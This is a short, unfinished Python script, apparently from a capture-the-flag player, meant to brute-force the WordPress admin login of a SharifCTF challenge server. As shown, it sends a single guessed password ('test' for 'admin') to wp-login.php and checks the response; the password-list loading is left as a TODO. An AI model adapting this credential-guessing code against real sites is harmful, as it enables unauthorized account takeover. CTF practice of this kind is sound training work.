#!/usr/local/bin/python

####
# AUTHOR: Federico G. De Faveri
# DATE:	Feb 2018
# PURPOSE: This python script will bruteforce a wp-admin login
#          for the web3 challenge of the ShariCTF competition
####

import requests
import time
import pprint

#define pretty print object
pp = pprint.PrettyPrinter(indent=4)

#eventually reading pwd dictionary files
##TODO

#create base URL to attack
base_attack_url = "http://ctf.sharif.edu:8082" + "/wp-login.php"

#make cookies
cookies = dict(wordpress_test_cookie='WP Cookie check')

#create the POST data payload
payload = { 'log':'admin' , 'pwd':'test' , 'wp-submit':'Log In' , 'redirect_to':'http://ctf.sharif.edu:8082/wp-admin/' , 'testcookie':1 }

#Execute the request
print("executing request...")
r = requests.post(base_attack_url , data=payload, cookies=cookies)

#get the status of response
status = r.status_code

#get the headers of the response
rhead = r.headers

print("STATUS " + str(status))
print("HEADER " + str(rhead))

print("--------")
print(r.text)
print("--------")

if "is incorrect" in r.text:
	print "######### LOGIN FAILED"
else:
	print "########################### LOGIN SUCCESS - pwd: " + "x"